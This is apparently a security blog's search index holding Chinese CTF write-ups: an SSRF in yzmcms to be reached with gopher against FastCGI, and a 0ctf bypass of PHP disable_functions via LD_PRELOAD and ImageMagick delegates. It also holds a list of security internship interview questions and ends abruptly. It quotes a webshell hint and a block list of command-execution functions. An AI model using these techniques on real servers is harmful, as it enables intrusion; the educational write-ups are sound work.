<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019 高校运维 ezcms 复现</title>
    <url>/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>之前高校运维碰到的题目, 当时就我一个人输出 web + 自己太菜了, 就没做出来 _(:3」∠)_, 寒假有时间看看, 复现一下题目.</p>
<a id="more"></a>

<p>题目非常良心的给了 docker-compose.yml, 所以搭建环境很简单. 把 install.lock 删掉重新装一遍就 ok.<br>经过一段时间审计, 可以发现 <code>application/collection/controller/collection_content.class.php</code> 中 <code>collection_test</code> 等函数, 实际上未经任何过滤就将 URL 传给了 <code>collection::get_content</code>.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 添加采集节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$_POST[<span class="string">'urlpage'</span>]) showmsg(<span class="string">'网址配置不能为空！'</span>);</span><br><span class="line">        $res = D(<span class="string">'collection_node'</span>)-&gt;insert($_POST);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), U(<span class="string">'init'</span>), <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_failure'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;admin_tpl(<span class="string">'collection_node_add'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">collection_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!$id) showmsg(L(<span class="string">'lose_parameters'</span>));</span><br><span class="line">    $data = D(<span class="string">'collection_node'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'nodeid'</span> =&gt; $id))-&gt;find();</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'urlpage'</span>] == <span class="string">''</span>) showmsg(<span class="string">'网址配置不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//目标网址</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'sourcetype'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        $url = str_replace(<span class="string">'(*)'</span>, $data[<span class="string">'pagesize_start'</span>], $data[<span class="string">'urlpage'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $url = $data[<span class="string">'urlpage'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义采集列表区间</span></span><br><span class="line">    $url_start = $data[<span class="string">'url_start'</span>];</span><br><span class="line">    $url_end = $data[<span class="string">'url_end'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($url_start == <span class="string">''</span> || $url_end == <span class="string">''</span>) showmsg(<span class="string">'列表区域配置不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    $content = collection::get_content($url);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_content</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$url = $url;</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (extension_loaded(<span class="string">'curl'</span>)) &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $content = @file_get_contents($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> trim($content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的 SSRF, 再结合 nginx 配置.</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># With php-fpm (or other unix sockets):</span></span><br><span class="line"><span class="comment">#	fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span></span><br><span class="line">    <span class="comment"># With php-cgi (or other tcp sockets):</span></span><br><span class="line">    <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显就是 gopher 打 fastcgi 了.</p>
<p>根据 view 里的文字, 可以猜出是采集功能. 用默认账号密码 yzmcms 登录进后台之后在模块管理里面就能找到, 拿 gopherus 一把梭就可以.</p>
<p>然后我去看了眼最新代码 <code>https://github.com/yzmcms/yzmcms</code>. 仍然没有修复, 怪不得 wp 还没出来 (逃</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>0ctf Wallbreaker Easy Writeup</title>
    <url>/2019/03/26/0ctf-Wallbreaker-Easy-Writeup/</url>
    <content><![CDATA[<p>本文首发于<a href="https://xz.aliyun.com/t/4589" target="_blank" rel="noopener">先知</a>  </p>
<p>周末打了两天, 自闭 web 狗就做出来这一题, 另一题不知道调用啥 mbean 能拿 shell. 总之题目质量真的是非常高, 学到了很多.  </p>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Imagick is a awesome library for hackers to break &#96;disable_functions&#96;.</span><br><span class="line">So I installed php-imagick in the server, opened a &#96;backdoor&#96; for you.</span><br><span class="line">Let&#39;s try to execute &#96;&#x2F;readflag&#96; to get the flag.</span><br><span class="line">Open basedir: &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp&#x2F;949c1400c8390865cb5939a106fec0b6</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WALLBREAKER EASY</span><br><span class="line">Ubuntu 18.04 &#x2F; apt install php php-fpm php-imagick</span><br></pre></td></tr></table></figure>

<p>第一眼看上去, 直接给了 webshell, 要求是执行根目录下的 <code>/readflag</code>,<br>先执行一波 <code>phpinfo()</code> 看看信息.<br><img src="https://i.loli.net/2019/03/25/5c98caa8c8e93.png" alt=""><br><img src="https://i.loli.net/2019/03/25/5c98caa8cc2e2.png" alt=""><br><img src="https://i.loli.net/2019/03/25/5c98caa90a2f7.png" alt="">  </p>
<p>可以看到是 lnp 64 位环境, disable_function 如下  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>

<p>Imagick 信息如下<br><img src="https://i.loli.net/2019/03/25/5c98caa92f03a.png" alt=""></p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>可以看到禁用了全部能直接执行程序的函数, 顺便还禁用了 mail, 不然的话可以直接用 <code>LD_PRELOAD</code> 来执行系统命令. 具体可以看这个<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">项目</a>.  </p>
<p>接下来第一反应是通过 ghostscript 的 0day 打一波试试, 但尝试了几次全部都没有反应… 好吧没有报错太蛋疼了, 我们还是照着提示搭一波环境吧.  </p>
<p>然后发现这里其实就真的跟提示一样, 全是最新的环境, 所以肯定是不存在已知的严重 0day 的…<br>同时, 可以看到在默认的配置文件中, 已经禁用了 ghostscript 的使用, 不能通过 gs 来命令执行.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$ cat /etc/ImageMagick-6/policy.xml </span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE policymap [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT policymap (policy)+&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT policy (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST policy domain (delegate|coder|filter|path|resource) #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST policy name CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST policy rights CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST policy pattern CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST policy value CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">policymap</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;policy domain="resource" name="temporary-path" value="/tmp"/&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"memory"</span> <span class="attr">value</span>=<span class="string">"256MiB"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"map"</span> <span class="attr">value</span>=<span class="string">"512MiB"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"width"</span> <span class="attr">value</span>=<span class="string">"16KP"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"height"</span> <span class="attr">value</span>=<span class="string">"16KP"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"area"</span> <span class="attr">value</span>=<span class="string">"128MB"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"resource"</span> <span class="attr">name</span>=<span class="string">"disk"</span> <span class="attr">value</span>=<span class="string">"1GiB"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"delegate"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"URL"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"delegate"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"HTTPS"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"delegate"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"HTTP"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- in order to avoid to get image with password text --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"path"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"@*"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"cache"</span> <span class="attr">name</span>=<span class="string">"shared-secret"</span> <span class="attr">value</span>=<span class="string">"passphrase"</span> <span class="attr">stealth</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- disable ghostscript format types --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"PS"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"EPI"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"PDF"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"XPS"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">policymap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看起来好像一切的都没了希望, 但这时突然想起, 有没有可能通过 <code>Imagick</code> 来达到 <code>mail</code> 函数类似的效果呢? 上面的 <code>LD_PRELOAD</code> 其实是劫持了启动进程这一行为, 也就是说, 如果我们能让 <code>Imagick</code> 调用外部进程, 我们完全可以不通过 <code>mail</code> 来执行系统命令.  </p>
<p><code>Imagick</code> 的底层是 <code>ImageMagick</code>, 这里就要说 <code>ImageMagick</code> 的 <code>delegate</code> 问题, <code>ImageMagick</code> 其实并没有实现所有文件格式的转换, 而是启动外部程序来进行转换, 就像上面的 ghostscript, 如果要将图片转换为 pdf, 就需要调用 ghostscript 来转换, 而这就会启动新的进程, 触发 <code>LD_PRELAOD</code>.  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$ cat /etc/ImageMagick-6/delegates.xml </span><br><span class="line"><span class="meta">&lt;!DOCTYPE delegatemap [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT delegatemap (delegate)+&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT delegate (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate decode CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate encode CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate mode CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate spawn CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate stealth CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate thread-support CDATA #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST delegate command CDATA #REQUIRED&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delegatemap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 省略很多行 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"bmp"</span> <span class="attr">encode</span>=<span class="string">"wdp"</span> <span class="attr">command</span>=<span class="string">"/bin/mv &amp;quot;%i&amp;quot; &amp;quot;%i.bmp&amp;quot;; &amp;quot;JxrEncApp&amp;quot; -i &amp;quot;%i.bmp&amp;quot; -o &amp;quot;%o.jxr&amp;quot;; /bin/mv &amp;quot;%i.bmp&amp;quot; &amp;quot;%i&amp;quot;; /bin/mv &amp;quot;%o.jxr&amp;quot; &amp;quot;%o&amp;quot;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"ppt"</span> <span class="attr">command</span>=<span class="string">"&amp;quot;soffice&amp;quot; --convert-to pdf -outdir `dirname &amp;quot;%i&amp;quot;` &amp;quot;%i&amp;quot; 2&amp;gt; &amp;quot;%u&amp;quot;; /bin/mv &amp;quot;%i.pdf&amp;quot; &amp;quot;%o&amp;quot;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"pptx"</span> <span class="attr">command</span>=<span class="string">"&amp;quot;soffice&amp;quot; --convert-to pdf -outdir `dirname &amp;quot;%i&amp;quot;` &amp;quot;%i&amp;quot; 2&amp;gt; &amp;quot;%u&amp;quot;; /bin/mv &amp;quot;%i.pdf&amp;quot; &amp;quot;%o&amp;quot;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"ps:alpha"</span> <span class="attr">stealth</span>=<span class="string">"True"</span> <span class="attr">command</span>=<span class="string">"&amp;quot;gs&amp;quot; -sstdout=%%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pngalpha&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"ps:cmyk"</span> <span class="attr">stealth</span>=<span class="string">"True"</span> <span class="attr">command</span>=<span class="string">"&amp;quot;gs&amp;quot; -sstdout=%%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pamcmyk32&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 省略很多行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">delegatemap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到有很多的 delegate, 在进行这些格式的编码以及解码时, <code>ImageMagick</code> 会调用这些外部程序. 但是这些外部程序大部分其实都不自带, 得自己安装, 不会起新的进程, 但是可以注意到这个特殊的格式,  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"bmp"</span> <span class="attr">encode</span>=<span class="string">"wdp"</span> <span class="attr">command</span>=<span class="string">"/bin/mv &amp;quot;%i&amp;quot; &amp;quot;%i.bmp&amp;quot;; &amp;quot;JxrEncApp&amp;quot; -i &amp;quot;%i.bmp&amp;quot; -o &amp;quot;%o.jxr&amp;quot;; /bin/mv &amp;quot;%i.bmp&amp;quot; &amp;quot;%i&amp;quot;; /bin/mv &amp;quot;%o.jxr&amp;quot; &amp;quot;%o&amp;quot;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中有系统自带的 mv, 这肯定是能执行成功的, 我们只要通过转换格式就能调用这个 delegate.<br>通过 strace 也可以发现确实调用了 mv, 即使因为 JxrEncApp 不存在导致图片转换失败, 但只要因为 mv 调起了新进程, 我们就能执行任意命令.</p>
<p><img src="https://i.loli.net/2019/03/25/5c98d6280c9a5.png" alt=""><br><img src="https://i.loli.net/2019/03/25/5c98d627f3530.png" alt="">  </p>
<p>这样, 就可以通过 <code>ImageMagick</code> 来触发新进程的产生, 并通过修改 <code>LD_PRELOAD</code> 的方式来执行任意系统命令.  </p>
<p>最后 exp 如下, 写入so文件<br><img src="https://i.loli.net/2019/03/25/5c98caa992bb6.png" alt=""><br>修改 <code>LD_PRELOAD</code> 并转换图片格式, 最终执行系统变量 <code>EVIL_CMDLINE</code> 里的命令.<br><img src="https://i.loli.net/2019/03/25/5c98caa98b8aa.png" alt="">  </p>
<p>PS. 写入 so 文件的时候记得把 base64 里的 <code>+</code> 给编码, 不然会被当成空格.  </p>
<p>还有一种思路是修改 <code>PATH</code> 环境变量, 修改为 <code>/tmp/xxx/</code>, 然后新建一个名为 <code>JxrEncApp</code> 之类的的恶意文件,<br><code>ImageMagick</code> 在 <code>delegete</code> 的时候将会调用这个, 从而执行命令.  </p>
<p>不得不说题目质量是真的高, 膜 rr.  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了这种 <code>LD_PRELOAD</code> 的方式之外, 还有其他一些骚操作, 可以看 <a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">l3m0n</a> 师傅总结的.<br>在遇到这种困境时, 不防想想有没有什么其他办法能 bypass 掉当前的限制, 开辟新的方法.  </p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
        <tag>0ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年春季安全岗实习面试经历</title>
    <url>/2020/03/23/2020-%E5%B9%B4%E5%AE%89%E5%85%A8%E5%B2%97%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</url>
    <content><![CDATA[<p>不定时更新</p>
<a id="more"></a>

<h2 id="字节跳动-企业应用安全-Offer"><a href="#字节跳动-企业应用安全-Offer" class="headerlink" title="字节跳动-企业应用安全 (Offer)"></a>字节跳动-企业应用安全 (Offer)</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol>
<li>自我介绍</li>
<li>实习经历</li>
<li>实习时候用的 SAST 工具是什么, 怎么实现的 </li>
<li>python list 去重</li>
<li>python 怎么去掉数组最后一个 element</li>
<li>python 什么函数可以将 dict 内不存在 key, value 就设置并返回其值 (setdefault)</li>
<li>python 哪些数据类型</li>
<li>进程间通讯方法</li>
<li>写过 log 库没</li>
<li>印象最深的渗透/挖洞经历</li>
<li>有没有挖过 src</li>
<li>数据库学的什么水平</li>
<li>一般给哪些属性建索引</li>
<li>redis 用过么, 怎么用的</li>
<li>python 常用哪些库</li>
<li>flask 介绍一下</li>
<li>flask 身份验证功能怎么实现</li>
<li>python, c 垃圾回收怎么实现的</li>
<li>你写的项目介绍一下</li>
<li>CBC 加密原理</li>
<li>加密中损坏一位, 对接下来的影响</li>
<li>有什么加密方式能解决这个问题</li>
<li>leetcode 179 // 没让手撕, 但是我没有刷过算法题 orz, 所以还是没答出来, 最多做做 easy 难度 (逃</li>
<li>你有什么问题问我</li>
</ol>
<h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol>
<li>自我介绍</li>
<li>web 安全和企业安全的联系, 区别等</li>
<li>csrf 原理</li>
<li>csrf 防御</li>
<li>xss 原理</li>
<li>xss 防御</li>
<li>vue 怎么防御的</li>
<li>mxss</li>
<li>ssrf 绕过</li>
<li>chrome xss auidtor 知道么, 怎么绕过</li>
<li>项目介绍一下</li>
<li>印象最深的渗透/挖洞经历</li>
<li>有审计过框架么, 哪些, 介绍一下</li>
<li>fastjson 最新的利用链了解么</li>
<li>你有什么问题问我</li>
</ol>
<h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><ol>
<li>自我介绍</li>
<li>实习经历</li>
<li>ctf 经历介绍一下, 打的比赛经历说一下</li>
<li>csrf 原理</li>
<li>cookie samesite 介绍一下</li>
<li>算法题, 终于是 easy 难度了, 字符串去重 (“ttgggggttaa123dd” -&gt; “tgta123d”)</li>
<li>写的算法复杂度多少</li>
<li>怎么写测试用例</li>
<li>tcp 三次握手</li>
<li>用过哪些工具</li>
<li>BurpSuite 代理原理</li>
<li>BurpSuite Intruder 是干嘛的 介绍一下</li>
<li>https 原理</li>
<li>https 在 wireshark 下怎么解密</li>
<li>tcp window size</li>
<li>tcp 滑动窗口</li>
<li>有没有渗透经历</li>
<li>啥时候能入职</li>
<li>过来想干嘛</li>
<li>有什么问题问我</li>
</ol>
<h2 id="腾讯-TSRC-口头-Offer-拒"><a href="#腾讯-TSRC-口头-Offer-拒" class="headerlink" title="腾讯-TSRC (口头 Offer 拒)"></a>腾讯-TSRC (口头 Offer 拒)</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol>
<li>自我介绍</li>
<li>sql 盲注</li>
<li>sql 盲注, 怎么解决速度问题</li>
<li>ssrf 怎么绕过, 检测 (DNS log)</li>
<li>mysql 读本地文件需要哪些权限</li>
<li>mysql 读本地文件权限具体名字</li>
<li>fastjson, java 反序列化检测 (DNS log + 1)</li>
<li>rmi 利用</li>
<li>oauth2 可能出现的漏洞</li>
<li>xss 跨域</li>
<li>postMessage 跨域利用方式</li>
<li>ssrf 打内网思路, 各种服务, redis, docker(k8s 那块, 没用过) 等</li>
<li>服务器被入侵, 检测挖矿病毒并溯源</li>
<li>查看文件修改时间</li>
<li>查看进程打开的文件, 端口</li>
<li>一个购物网站, 从购买到支付可能存在的漏洞</li>
<li>sql 注入 OOB</li>
<li>实现一个自动扫描器的思路</li>
<li>挖框架漏洞的思路</li>
<li>写过扫描器么</li>
<li>端口扫描器的原理</li>
<li>端口扫描器系统指纹识别的原理</li>
<li>你有什么问题问我</li>
</ol>
<h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol>
<li>自我介绍</li>
<li>java 反序列化</li>
<li>java commons-collections 怎么利用的</li>
<li>java rmi 怎么利用</li>
<li>java rmi 打注册局</li>
<li>java JNDI 注入</li>
<li>怎么学习安全相关知识的</li>
<li>windows 提权</li>
<li>linux 提权</li>
<li>绕 IDS, WAF</li>
<li>域渗透</li>
<li>日过哪些站</li>
<li>太多了记不住了, 问了一小时嘴巴都干了 orz</li>
</ol>
<h3 id="三面-1"><a href="#三面-1" class="headerlink" title="三面"></a>三面</h3><ol>
<li>自我介绍</li>
<li>问一些项目</li>
<li>实习经历</li>
<li>挖洞思路</li>
<li>实习时候挖了哪些洞</li>
<li>ssrf 原理, 绕过</li>
<li>fastjson 原理, 怎么绕过的</li>
<li>渗透经历</li>
<li>有没有搞过免杀</li>
<li>搞过 apk 逆向等</li>
<li>聊家常 orz</li>
<li>说一些工作内容, 比如应急响应 (7x24) 能不能接受</li>
</ol>
<h2 id="腾讯-云鼎实验室-Offer-拒"><a href="#腾讯-云鼎实验室-Offer-拒" class="headerlink" title="腾讯-云鼎实验室 (Offer 拒)"></a>腾讯-云鼎实验室 (Offer 拒)</h2><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><ol>
<li>实习经历</li>
<li>file_exist 有什么思路</li>
<li>codeql 了解么 (刚好之前看了 rr 发的 post, tql)</li>
<li>php 混淆有哪些思路</li>
<li>webpack source map 源码泄漏, 攻击思路</li>
<li>文件上传思路</li>
<li>比赛哪道题映像深刻</li>
</ol>
<p>PS. 一开始就说大概聊 15 分钟, 真就 15 分钟, 也不用自我介绍, 效率是真的高 orz, 可以看到问的是一些相对前沿的问题吧, 毕竟实验室 tql<br>比较奇怪的是我在被腾讯的两个部门同时面试 orz, 不知道啥情况  </p>
<h3 id="二面-2"><a href="#二面-2" class="headerlink" title="二面"></a>二面</h3><p>主要问相关经验和一些基础知识  </p>
<h3 id="三面-HR-面"><a href="#三面-HR-面" class="headerlink" title="三面 + HR 面"></a>三面 + HR 面</h3><p>聊聊天, 没啥问题  </p>
<h2 id="阿里-Offer-拒"><a href="#阿里-Offer-拒" class="headerlink" title="阿里 (Offer 拒)"></a>阿里 (Offer 拒)</h2><h3 id="一面-3"><a href="#一面-3" class="headerlink" title="一面"></a>一面</h3><ol>
<li>自我介绍</li>
<li>CTF 比赛有哪一题映像深, 介绍一下</li>
<li>项目, 你的 ezrasp 怎么实现的</li>
<li>怎么防止命令注入</li>
<li>common-collections 反序列化漏洞原理</li>
<li>除了 ProcessImpl, 其他的命令执行方法 (loadLibrary)</li>
<li>无文件落地? (Windows uncpath 加载远程的)</li>
<li>有什么绕过 rasp 的思路</li>
<li>为什么要写这个</li>
<li>burp 破解原理</li>
<li>大量日志怎么管理</li>
<li>xss 平台介绍</li>
